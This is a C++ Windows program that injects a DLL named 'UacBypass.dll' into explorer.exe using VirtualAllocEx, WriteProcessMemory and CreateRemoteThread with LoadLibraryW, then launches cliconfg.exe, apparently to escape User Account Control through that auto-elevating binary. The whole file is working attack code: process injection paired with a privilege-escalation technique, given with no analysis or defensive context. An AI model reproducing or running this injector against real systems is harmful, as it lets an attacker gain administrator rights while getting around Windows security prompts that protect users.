#include <cstdio>
#include <Windows.h>
#include <string>
#include <tlhelp32.h>
EXTERN_C IMAGE_DOS_HEADER __ImageBase;

int main()
{
	DWORD pid = 0;
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32 process;
	ZeroMemory(&process, sizeof(process));
	process.dwSize = sizeof(process);
	if (Process32First(snapshot, &process))
	{
		do
		{
			if (wcscmp(process.szExeFile, L"explorer.exe")==0)
			{
				pid = process.th32ProcessID;
				break;
			}
		} while (Process32Next(snapshot, &process));
	}

	CloseHandle(snapshot);
	if (pid == 0)
		return -1;
	auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pid);
	HANDLE hThread;

	WCHAR   DllPath[MAX_PATH] = { 0 };
	GetModuleFileName((HINSTANCE)&__ImageBase, DllPath, _countof(DllPath));
	std::wstring path(DllPath);
	const size_t last = path.rfind('\\');
	if (std::wstring::npos != last)
	{
		path = path.substr(0, last + 1);
	}
	path += L"UacBypass.dll";
	void* pLibRemote;
	DWORD hLibModule;
	HMODULE hKernel32 = ::GetModuleHandle(L"Kernel32");
	pLibRemote = ::VirtualAllocEx(hProcess, NULL, sizeof(wchar_t)*(path.length()+1),
		MEM_COMMIT, PAGE_READWRITE);
	WriteProcessMemory(hProcess, pLibRemote, (void*)path.data(),
		sizeof(wchar_t)*(path.length() + 1), NULL);
	hThread = CreateRemoteThread(hProcess, NULL, 0,(LPTHREAD_START_ROUTINE) GetProcAddress(hKernel32,"LoadLibraryW"),pLibRemote, 0, NULL);
	auto e = GetLastError();
	WaitForSingleObject(hThread, INFINITE);
	GetExitCodeThread(hThread, &hLibModule);
	CloseHandle(hThread);
	VirtualFreeEx(hProcess, pLibRemote, sizeof(wchar_t)*(path.length() + 1), MEM_RELEASE);

	hThread = CreateRemoteThread(hProcess, NULL, 0,(LPTHREAD_START_ROUTINE) GetProcAddress(hKernel32, "FreeLibrary"), (void*)hLibModule, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	system("C:\\Windows\\System32\\cliconfg.exe");
	return 0;
}

